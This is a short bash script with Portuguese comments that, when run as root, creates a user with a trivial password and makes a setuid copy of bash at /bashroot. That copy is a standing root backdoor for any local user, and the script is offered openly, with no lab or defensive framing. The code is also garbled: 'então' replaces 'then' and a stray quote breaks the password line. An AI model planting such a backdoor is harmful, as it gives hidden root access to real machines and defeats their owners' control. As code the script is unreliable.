#!/bin/bash

# Verifica se está sendo executado como root
if [ "$(id -u)" -ne 0 ]; então
  echo "Este script deve ser executado como root."
  exit 1
fi

# Defina o nome do novo usuário e a senha
NOVO_USUARIO=a
SENHA=aaaaaa"

# Cria o novo usuário
useradd -m -s /bin/bash "$NOVO_USUARIO"

# Define a senha para o novo usuário
echo "$NOVO_USUARIO:$SENHA" | chpasswd

# Cria uma cópia do bash com permissões de root
cp /bin/bash /bashroot
chmod +s /bashroot
chmod +x /bashroot

echo "Usuário $NOVO_USUARIO criado e adicionado com acesso ao bashroot."
